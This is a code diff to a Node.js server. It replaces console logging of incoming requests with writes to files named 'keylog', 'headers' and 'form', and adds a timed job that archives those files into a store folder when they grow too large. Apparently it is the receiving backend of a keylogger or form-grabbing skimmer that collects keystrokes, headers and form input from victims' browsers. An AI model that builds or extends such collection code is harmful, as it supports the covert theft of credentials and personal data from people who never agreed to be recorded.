@@ -37,7 +37,19 @@ server.on('request', function(req, res){
       data.date = Date.now();
 
       //send to db
-      console.log(data);
+      if(!data.data){
+        fs.appendFile('./admin/db/keylog', JSON.stringify(data)+ ',', function(err){
+          if(err){console.error(err)}
+        })
+      } else if(data.data.data){
+        fs.appendFile('./admin/db/headers', JSON.stringify(data)+ ',', function(err){
+          if(err){console.error(err)}
+        })
+      } else {
+        fs.appendFile('./admin/db/form', JSON.stringify(data)+ ',', function(err){
+          if(err){console.error(err)}
+        })
+      }
 
       res.writeHead(200, config.server.headers);
       return res.end(JSON.stringify({success: true}))
@@ -56,3 +68,20 @@ server.on('error', function(err){
 server.listen(port, function(){
   console.log('Server listening on port:'+ port)
 });
+
+setInterval(function(){
+  let arr = ['form','headers','keylog'];
+  for (let i = 0; i < arr.length; i++) {
+    fs.stat('./admin/db/'+ arr[i], function(err, stats){
+      if(err){return console.error(err)}
+      if(stats.size > config.db.max_size){
+        fs.copyFile('./admin/db/'+ arr[i], './admin/store/'+ arr[i] +'-'+ Date.now(), function(err){
+          if(err){return console.error(err)}
+          fs.writeFile('./admin/db/'+ arr[i], '[', function(err){
+            if(err){return console.error(err)}
+          })
+        })
+      }
+    })
+  }
+}, config.db.interval)
